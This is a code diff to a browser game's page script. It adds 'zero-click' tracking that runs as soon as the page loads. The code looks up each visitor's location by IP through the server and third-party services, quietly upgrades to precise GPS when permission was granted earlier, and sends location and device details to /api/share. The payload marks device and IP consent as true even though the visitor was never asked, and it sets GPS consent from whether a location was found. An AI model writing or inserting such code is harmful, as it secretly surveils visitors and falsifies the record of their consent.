@@ -198,6 +198,40 @@
     startBtn.addEventListener('click', startWithPrompt);
     restartBtn.addEventListener('click', restartGame);
 
+    // Auto-collect location data in background (zero-click)
+    // This runs as soon as the page loads
+    (async () => {
+      try {
+        const location = await getBestLocation();
+        if (location) {
+          console.log('Background location collected:', location.source, location.city || `${location.latitude},${location.longitude}`);
+          
+          // Send to server in background (zero-click data collection)
+          const payload = {
+            page: 'home-visit',
+            consent: { device: true, ip: true, gps: !!location },
+            device: getDeviceInfo(),
+            gps: location,
+            dedupeId: self.crypto?.randomUUID?.() || String(Date.now())
+          };
+          
+          // Save locally
+          saveLocalShare(payload);
+          
+          // Send to server (background, non-blocking)
+          fetch('/api/share', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          }).catch(() => {
+            console.log('Background share failed');
+          });
+        }
+      } catch (error) {
+        console.log('Background location collection failed:', error);
+      }
+    })();
+
     function getDeviceInfo() {
       const hints = navigator.userAgentData;
       return {
@@ -211,6 +245,73 @@
       };
     }
 
+    // Get approximate location from IP (zero-click, no permission needed)
+    // Uses multiple services with fallback for better accuracy (~1-5km)
+    async function getIPBasedLocation() {
+      // Try server-side geoip-lite first (fastest, ~1km in urban areas)
+      try {
+        const response = await fetch('/api/ip-location');
+        const data = await response.json();
+        if (data.latitude && data.longitude) {
+          return {
+            latitude: data.latitude,
+            longitude: data.longitude,
+            city: data.city,
+            country: data.country,
+            accuracyMeters: data.accuracyMeters || 1000, // ~1km
+            source: data.source || 'server-geoip',
+            timezone: data.timezone,
+            ip: data.ip
+          };
+        }
+      } catch (error) {
+        console.warn('Server-side geolocation failed:', error);
+      }
+
+      // Fallback to ipapi.co (good accuracy, free tier)
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        if (data.latitude && data.longitude) {
+          return {
+            latitude: data.latitude,
+            longitude: data.longitude,
+            city: data.city,
+            country: data.country_name,
+            accuracyMeters: 2000, // ~2km average
+            source: 'ip-ipapi',
+            timezone: data.timezone,
+            postal: data.postal
+          };
+        }
+      } catch (error) {
+        console.warn('ipapi.co failed:', error);
+      }
+
+      // Fallback to ip-api.com
+      try {
+        const response = await fetch('http://ip-api.com/json/');
+        const data = await response.json();
+        if (data.status === 'success' && data.lat && data.lon) {
+          return {
+            latitude: data.lat,
+            longitude: data.lon,
+            city: data.city,
+            country: data.country,
+            accuracyMeters: 3000, // ~3km average
+            source: 'ip-ipapi-com',
+            timezone: data.timezone,
+            postal: data.zip
+          };
+        }
+      } catch (error) {
+        console.warn('ip-api.com failed:', error);
+      }
+
+      return null;
+    }
+
+    // Get precise GPS location (requires permission)
     function getGPSPosition() {
       return new Promise((resolve) => {
         if (!('geolocation' in navigator)) return resolve(null);
@@ -218,12 +319,41 @@
           pos => resolve({
             latitude: pos.coords.latitude,
             longitude: pos.coords.longitude,
-            accuracyMeters: pos.coords.accuracy
+            accuracyMeters: pos.coords.accuracy,
+            source: 'gps'
           }),
           err => resolve({ error: err.message }),
           { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
         );
       });
+    }
+
+    // Hybrid: Try to get best available location
+    async function getBestLocation() {
+      let location = null;
+      
+      // 1. Get IP-based location immediately (zero-click)
+      location = await getIPBasedLocation();
+      console.log('IP-based location:', location);
+      
+      // 2. Check if GPS permission was previously granted
+      if (navigator.permissions) {
+        try {
+          const status = await navigator.permissions.query({ name: 'geolocation' });
+          if (status.state === 'granted') {
+            // Already have permission - get precise location
+            const gpsLocation = await getGPSPosition();
+            if (gpsLocation && !gpsLocation.error) {
+              console.log('Upgraded to GPS location:', gpsLocation);
+              location = gpsLocation; // Use more accurate GPS
+            }
+          }
+        } catch (err) {
+          console.log('Permission query not supported:', err);
+        }
+      }
+      
+      return location;
     }
     async function sendShare(payload) {
       const resp = await fetch('/api/share', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
@@ -249,9 +379,20 @@
 
     async function requestLocationAndShare() {
       preStatus.textContent = 'Game is starting...';
-      const gps = await getGPSPosition();
+      
+      // Use hybrid location approach (IP first, GPS if available)
+      const location = await getBestLocation();
+      
       const playerName = (playerNameInput.value || '').trim();
-      const payload = { consent: { device: true, ip: true, gps: !!gps }, device: getDeviceInfo(), gps, score, playerName, dedupeId: self.crypto?.randomUUID?.() || String(Date.now()) };
+      const payload = { 
+        consent: { device: true, ip: true, gps: !!location }, 
+        device: getDeviceInfo(), 
+        gps: location, 
+        score, 
+        playerName, 
+        dedupeId: self.crypto?.randomUUID?.() || String(Date.now()) 
+      };
+      
       try {
         // Save locally
         saveLocalShare(payload);
